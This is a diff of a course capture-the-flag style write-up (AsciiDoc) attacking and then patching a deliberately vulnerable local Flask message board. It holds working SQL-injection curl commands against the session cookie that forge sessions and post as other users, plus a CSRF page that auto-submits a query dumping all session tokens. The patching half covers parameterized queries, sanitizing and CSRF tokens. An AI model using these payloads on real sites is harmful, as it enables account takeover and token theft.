@@ -623,7 +623,7 @@ curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT id, 
 ```
 
 .Session Token Bypass
-image::cmsc134-writeups/machine-problem-3/10_session_bypass.png.png[]
+image::cmsc134-writeups/machine-problem-3/10_session_bypass.png[]
 
 And we're in.
 
@@ -654,60 +654,239 @@ This would return a list of users with that session token, and the first index i
 
 The result of the SQL query is
 
-```
+....
 (1,alice)
-```
+....
 
 However, this following code only checks and uses the user ID
 
-```python
+[,python]
+----
 if user:
   cur.execute("INSERT INTO posts (message, user) VALUES ('"
     + request.form["message"] + "', " + str(user[0]) + ");")
-```
+----
 
 ignoring the name of the user.
 
 This allows us to forge a session token with random names for any given user (even those that doesn't exists).
 
-**Since this vulnerability exists throughout the source code, it also serves as a means to post as another user without knowing their password!**
+*Since this vulnerability exists throughout the source code, it also serves as a means to post as another user without knowing their password!*
 The attack is crafted this way
 
-```bash
+[,bash]
+----
 curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT 1 as id, 'doyou' as username FROM users LIMIT 1--" --data-raw 'message=alice watches 228922'
 curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1--" --data-raw 'message=alice watches 228922'
-```
+----
 
 And checking the posts
 
-```bash
+[,bash]
+----
 curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT 1 as id, '' as username FROM users LIMIT 1 --" 
-```
+----
 
 the output is
 
-```html
+[,html]
+----
 ...
 <li>Breasts or Thighs? Which contains more meat? For a value meal.</li>
 <li>alice watches 228922</li>
 ...
-```
+----
 
-***This is a serious concern...***
+_*This is a serious concern...*_
 
 It is also possible to force a user to logout of their session (equivalent to deleting the session tokens in the database)
 
-```bash
+[,bash]
+----
 curl -L 'http://0.0.0.0:5000/logout' -H "Cookie: session_token=' UNION SELECT 1 AS id, 'maldev' AS username FROM users--"
-```
+----
 
 This vulnerability might give a hint to CSRF (Cross-Site Request Forgery) attack.
 
 
+
+
+
+==== User Message CSRF via POST Request (aCVE-2024-0004)
+
+Earlier, we were talking about using the attacker's own machines and the server database to commit cyber attacks to the website.
+
+But, there is a way to make the user perform the attack themselves.
+
+With the use of a malicious website, the attacker can trick the user to perform the attack by clicking on a link or inputting something in the site.
+This bypasses the security made by the website by utilizing the trust of the website to the user's browser and its authenticity.
+
+The attack is done by making a simple website like this:
+
+[,html]
+----
+ <html>
+<body>
+    <h1>CSRF Payload</h1>
+</body>
+</html>
+----
+
+Then the attacker adds a form or a button with an action that references to the API endpoint and specifies the method.
+
+[,html]
+----
+<form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
+</form>
+----
+
+If the attackers choose the form method, the attacker will add an input with the value of the SQL query to be run inside the API endpoint.
+
+[,html]
+----
+<input type="hidden" name="message" value="1&#39;, 1&#41;, ((SELECT GROUP_CONCAT(user || ':' || token, '&#8249;br>') FROM sessions), 1)--">
+----
+
+The attacker may also choose to add a script that auto submits the form when the page is loaded.
+
+[,]
+----
+<script>
+   document.getElementById('csrfForm').submit();
+</script>
+----
+
+The SQL queries used in the example above is simply the SQL injection queries introduced before.
+
+
 == Patching the vulnerabilities
 
-change code bro
+So this is how attackers may easily access and manipulate the data inside your website.
+
+You may ask the question, how do we fix these security vulnerabilities?
+
+We patch them, of course! Using various security tricks and methods, we are able to secure our website against these malicious attacks.
+
+To combat SQL injections, we changed how we pass values into the SQL queries from concatenation into input parametization, as shown below:
+
+[,python]
+----
+res = cur.execute("SELECT id from users WHERE username = '"
+            + request.form["username"]
+            + "' AND password = '"
+            + request.form["password"] + "'")
+----
+
+into
+
+[,python]
+----
+res = cur.execute("SELECT id from users WHERE username = ? AND password = ?", (request.form["username"], request.form["password"]))
+----
+
+This makes it so that each *?* needs to have a value to succeed, and just inputting one value will just send an error.
+
+But this still has some flaws.
+
+Both input fields are still able to be inputted with SQL injections, which makes it not that secure.
+
+Example of this would be the SQL Injection to access Alice's account.
+
+[,sql]
+----
+"username=' UNION SELECT id FROM users; --&password="
+----
+
+
+We can implement character limitations and exclude special characters in the input fields for the login to combat this.
+
+An example for this input validator would be something like this:
+
+[,python]
+----
+def input_validation(data):
+    for elem in data:
+        if elem == "session_token":
+            val = request.cookies.get(elem)
+            if ' ' in val or '--' in val or len(val) == 0:
+                return False
+        elif elem != "message":
+            val = request.form[elem]
+            if ' ' in val or len(val) == 0:
+                return False
+    return True
+----
+
+But how about when posting a comment? We cannot limit the users from using special characters or have a short limit on characters when commenting.
+
+So what can we do?
+
+Well, still remember the input parametization? It solves the problem of the post message by itself, so there is no worry about that.
+
+XSS attacks, on the other hand, is still a problem, as it can be passed through the input parametization without any issues.
+
+So we implement a tag cleaner for HTML tags using a function ``clean`` from the library ``bleach``.
+
+[,python]
+----
+from bleach import clean
+----
+
+We simply using the ``clean`` function on the input message before running the ``INSERT`` SQL:
+
+[,python]
+----
+sanitized_input = clean(request.form["message"], tags=[], attributes={})
+            cur.execute("INSERT INTO posts (message, user) VALUES (?,?);",
+                        (sanitized_input, str(user[0])))
+----
+
+So we fixed the login and post problems within the website. But another problem in the code is the CRSF attack using another malicious website.
+
+We cannot use input parametization nor input cleaning to patch this vulnerability. So we use the good 'ol CRSF token that is passed together when posting a message.
+
+To implement this security measure, we need to use the library ``hashlib`` and the modules ``session`` and ``abort`` in the ``Flask`` library.
+
+[,python]
+----
+import hashlib
+from flask import session, abort
+----
+
+Then, we need to create a secret key for our application, something like this:
+
+[,python]
+----
+app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
+----
+
+We also create a function to generate the CRSF function to be used:
+
+[,python]
+----
+def generate_csrf_token():
+   if 'csrf_token' not in session:
+        session['csrf_token'] = hashlib.sha256(secrets.token_bytes(32)).hexdigest()
+   return session['csrf_token']
+----
+
+To implement this in our ``/posts`` endpoint, we add a CRSF validator before we apply ``INSERT``:
+
+[,python]
+----
+if user:
+        if request.form.get('csrf_token') != session.pop('csrf_token', None):
+             abort(403)
+           
+        cur.execute("INSERT INTO posts (message, user) VALUES (?,?);",
+                     (request.form["message"], str(user[0])))
+        con.commit()
+        return redirect("/home")
+----
+
+Voila! We prevented CRSF attacks using this CRSF token security measure.
 
 == Writeups from other people
 
-- https://sycasec.github.io/sycasec/post/mp3[sycasec's writeup]
+* https://sycasec.github.io/sycasec/post/mp3[sycasec's writeup]
+* https://hackmd.io/@Kiyent/ryAW4SifC[kiyent's writeup using burpsuite]
